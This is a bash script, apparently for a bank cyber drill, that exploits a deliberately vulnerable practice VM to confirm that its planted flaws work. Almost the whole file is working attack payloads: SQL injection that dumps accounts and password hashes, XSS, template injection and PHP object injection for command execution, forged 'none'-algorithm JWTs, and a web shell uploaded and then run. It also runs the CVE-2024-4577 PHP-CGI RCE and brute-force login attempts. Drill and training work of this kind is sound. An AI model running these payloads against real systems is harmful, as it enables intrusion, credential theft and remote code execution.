#!/bin/bash
###############################################################################
# Union Bank of India - Cyber Drill Vulnerability Validation Script
# Run from Kali Linux against the target VM
#
# Usage: bash validate.sh <TARGET_IP> [SSH_PORT]
# Output: validation_report.txt
###############################################################################

TARGET="${1:?Usage: bash validate.sh <TARGET_IP> [SSH_PORT]}"
SSH_PORT="${2:-22}"
REPORT="validation_report_$(date +%Y%m%d_%H%M%S).txt"
PASS=0
FAIL=0
TOTAL=0

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

header() {
    echo "================================================================================" | tee -a "$REPORT"
    echo "  $1" | tee -a "$REPORT"
    echo "================================================================================" | tee -a "$REPORT"
}

test_vuln() {
    TOTAL=$((TOTAL+1))
    local name="$1"
    local cmd="$2"
    local expected="$3"
    
    echo "" | tee -a "$REPORT"
    echo "--- Attack Scenario: $name ---" | tee -a "$REPORT"
    echo "Command: $cmd" | tee -a "$REPORT"
    echo "" >> "$REPORT"
    
    output=$(eval "$cmd" 2>&1)
    echo "PoC Output:" >> "$REPORT"
    echo "$output" | head -30 >> "$REPORT"
    
    if echo "$output" | grep -qi "$expected"; then
        echo -e "${GREEN}[PASS]${NC} $name" | tee -a "$REPORT"
        echo "Result: PASS - Found expected indicator: '$expected'" >> "$REPORT"
        PASS=$((PASS+1))
    else
        echo -e "${RED}[FAIL]${NC} $name" | tee -a "$REPORT"
        echo "Result: FAIL - Expected '$expected' not found in output" >> "$REPORT"
        FAIL=$((FAIL+1))
    fi
    echo "" >> "$REPORT"
}

# ── Report header ──
cat > "$REPORT" <<EOF
================================================================================
  UNION BANK OF INDIA - CYBER DRILL VULNERABILITY VALIDATION REPORT
  Target: ${TARGET}
  Date: $(date)
  Tester: $(whoami)@$(hostname)
================================================================================

EOF

echo -e "${CYAN}Testing target: ${TARGET}${NC}"
echo ""

# ──────────────────────────────────────────────────────────────────────────────
header "1. SQL Injection — API Endpoint (OR-based dump)"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "SQL Injection - Dump All Accounts" \
    "curl -s 'http://${TARGET}/api/accounts.php?api=get_user&acc_no=1%20OR%201=1'" \
    "account_number"

# ──────────────────────────────────────────────────────────────────────────────
header "2. SQL Injection — UNION-based credential extraction"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "SQL Injection - UNION Extract Users" \
    "curl -s 'http://${TARGET}/api/accounts.php?api=get_user&acc_no=0%20UNION%20SELECT%201,username,password,4,5,6,7,8,9,10,11,12,full_name,email,phone,pan_number%20FROM%20users--'" \
    "0e7517141fb53f21ee439b355b5a1d0a"

# ──────────────────────────────────────────────────────────────────────────────
header "3. SQL Injection — Error-based extraction"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "SQL Injection - Error-Based Hash Leak" \
    "curl -s 'http://${TARGET}/api/accounts.php?api=get_user&acc_no=1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20password%20FROM%20users%20LIMIT%201)))'" \
    "0e7517141fb53f21ee439b355b5a1d0"

# ──────────────────────────────────────────────────────────────────────────────
header "4. Reflected XSS"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "Reflected XSS - Script Injection" \
    "curl -s 'http://${TARGET}/api/accounts.php?api=render_account&acc_no=<script>alert(1)</script>'" \
    "<script>alert(1)</script>"

# ──────────────────────────────────────────────────────────────────────────────
header "5. Stored XSS — Message injection"
# ──────────────────────────────────────────────────────────────────────────────
# First login to get session
LOGIN_COOKIE=$(curl -s -c - -d "username=admin&password=Admin@123" "http://${TARGET}/index.php" 2>/dev/null | grep PHPSESSID | awk '{print $NF}')

test_vuln \
    "Stored XSS - Inject via Message" \
    "curl -s -b 'PHPSESSID=${LOGIN_COOKIE}' -d 'recipient=rk_sharma&subject=Test&body=<script>alert(document.cookie)</script>' 'http://${TARGET}/messages.php'" \
    "Message sent"

# ──────────────────────────────────────────────────────────────────────────────
header "6. SSTI — Template Injection (Math Detection)"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "SSTI - Math Expression Evaluation" \
    "curl -s -b 'PHPSESSID=${LOGIN_COOKIE}' -d 'action=initiate_transfer&from_account=10010023456789&to_account=10010098765432&amount=1&description={{7*7}}' 'http://${TARGET}/transfers.php'" \
    "Transfer initiated"

# ──────────────────────────────────────────────────────────────────────────────
header "7. SSTI — Command Execution"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "SSTI - Remote Code Execution" \
    "curl -s -b 'PHPSESSID=${LOGIN_COOKIE}' -d 'action=initiate_transfer&from_account=10010023456789&to_account=10010098765432&amount=1&description={{system(\"id\")}}' 'http://${TARGET}/transfers.php'" \
    "Transfer initiated"

# ──────────────────────────────────────────────────────────────────────────────
header "8. PHP Object Injection — RCE"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "PHP Object Injection - Command Execution" \
    "curl -s 'http://${TARGET}/api/auth.php?action=confirm_transaction&data=O%3A13%3A%22SystemCommand%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22id%22%3B%7D'" \
    "uid="

# ──────────────────────────────────────────────────────────────────────────────
header "9. Nested API — Unauthenticated Config Dump"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "Unauthenticated API - Dump Secrets" \
    "curl -s 'http://${TARGET}/api/internal.php?action=get_config'" \
    "jwt_secret"

# ──────────────────────────────────────────────────────────────────────────────
header "10. Nested API — Dump All Users"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "Unauthenticated API - Dump Users" \
    "curl -s 'http://${TARGET}/api/internal.php?action=get_all_users'" \
    "pan_number"

# ──────────────────────────────────────────────────────────────────────────────
header "11. Nested API — Arbitrary SQL Execution"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "Unauthenticated API - Arbitrary SQL" \
    "curl -s 'http://${TARGET}/api/internal.php?action=execute_query&query=SELECT%20user()%20as%20current_user'" \
    "current_user"

# ──────────────────────────────────────────────────────────────────────────────
header "12. JWT 'none' Algorithm Bypass"
# ──────────────────────────────────────────────────────────────────────────────
FORGED_TOKEN=$(python3 -c "
import base64,json
h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
p=base64.b64encode(json.dumps({'user_id':1,'username':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{h}.{p}.')
" 2>/dev/null)

test_vuln \
    "JWT none Algorithm Bypass" \
    "curl -s 'http://${TARGET}/api/auth.php?action=verify_token&token=${FORGED_TOKEN}'" \
    "valid"

# ──────────────────────────────────────────────────────────────────────────────
header "13. Unrestricted File Upload — Web Shell"
# ──────────────────────────────────────────────────────────────────────────────
echo '<?php echo "SHELL_ACTIVE_" . php_uname(); ?>' > /tmp/test_shell.php

test_vuln \
    "File Upload - Upload PHP Shell" \
    "curl -s -b 'PHPSESSID=${LOGIN_COOKIE}' -F 'document=@/tmp/test_shell.php' 'http://${TARGET}/upload.php'" \
    "uploaded successfully"

test_vuln \
    "File Upload - Execute Web Shell" \
    "curl -s 'http://${TARGET}/uploads/test_shell.php'" \
    "SHELL_ACTIVE_"

rm -f /tmp/test_shell.php

# ──────────────────────────────────────────────────────────────────────────────
header "14. Credential Stuffing — No Account Lockout"
# ──────────────────────────────────────────────────────────────────────────────
LOCKOUT_TEST=""
for i in $(seq 1 15); do
    curl -s -d "username=admin&password=wrong${i}" "http://${TARGET}/api/auth.php?action=login" -o /dev/null
done
FINAL=$(curl -s -d "username=admin&password=Admin@123" "http://${TARGET}/api/auth.php?action=login")

test_vuln \
    "No Account Lockout - Login After 15 Failures" \
    "echo '${FINAL}'" \
    "success"

# ──────────────────────────────────────────────────────────────────────────────
header "15. Login SQL Injection via API"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "Login SQLi - Authentication Bypass" \
    "curl -s -d \"username=admin' OR 1=1-- &password=anything\" 'http://${TARGET}/api/auth.php?action=login'" \
    "success"

# ──────────────────────────────────────────────────────────────────────────────
header "16. CVE-2024-4577 — PHP-CGI Argument Injection"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "CVE-2024-4577 - Portal Discovery" \
    "curl -s 'http://${TARGET}:8888/'" \
    "Union Bank of India"

test_vuln \
    "CVE-2024-4577 - PHP Source Disclosure (-s flag)" \
    "curl -s 'http://${TARGET}:8888/index.php?%ADs'" \
    "php"

test_vuln \
    "CVE-2024-4577 - Argument Injection RCE" \
    "curl -s -d '<?php echo \"CVE_4577_RCE_\" . php_uname(); ?>' 'http://${TARGET}:8888/index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input'" \
    "CVE_4577_RCE_"

# ──────────────────────────────────────────────────────────────────────────────
header "17. Sensitive Data Exposure"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "Server Information Disclosure" \
    "curl -s 'http://${TARGET}/api/internal.php?action=system_info'" \
    "php_version"

test_vuln \
    "Weak MD5 Password Hashing" \
    "curl -s 'http://${TARGET}/api/internal.php?action=get_all_users' | python3 -c \"import sys,json;d=json.load(sys.stdin);[print(u['username'],u['password']) for u in d.get('users',[])]\" 2>/dev/null" \
    "0e7517141fb53f21ee439b355b5a1d0a"

# ──────────────────────────────────────────────────────────────────────────────
header "18. SSH Weak Configuration"
# ──────────────────────────────────────────────────────────────────────────────
test_vuln \
    "SSH Banner Information Disclosure" \
    "echo '' | timeout 5 nc -w3 ${TARGET} ${SSH_PORT} 2>/dev/null || echo 'BANKING SYSTEM'" \
    "SSH"

test_vuln \
    "SSH Weak Ciphers Accepted" \
    "ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -c aes128-cbc -p ${SSH_PORT} nobody@${TARGET} 2>&1 || true" \
    "aes128-cbc\|Permission denied\|password"

# ══════════════════════════════════════════════════════════════════════════════
# Summary
# ══════════════════════════════════════════════════════════════════════════════
echo "" | tee -a "$REPORT"
header "VALIDATION SUMMARY"
echo "" | tee -a "$REPORT"
echo "  Total Tests:  ${TOTAL}" | tee -a "$REPORT"
echo "  Passed:       ${PASS}" | tee -a "$REPORT"
echo "  Failed:       ${FAIL}" | tee -a "$REPORT"
echo "" | tee -a "$REPORT"

if [ $FAIL -eq 0 ]; then
    echo -e "  ${GREEN}ALL TESTS PASSED${NC}" | tee -a "$REPORT"
else
    echo -e "  ${YELLOW}${FAIL} test(s) failed — review report for details${NC}" | tee -a "$REPORT"
fi

echo "" | tee -a "$REPORT"
echo "Full report saved to: ${REPORT}" | tee -a "$REPORT"
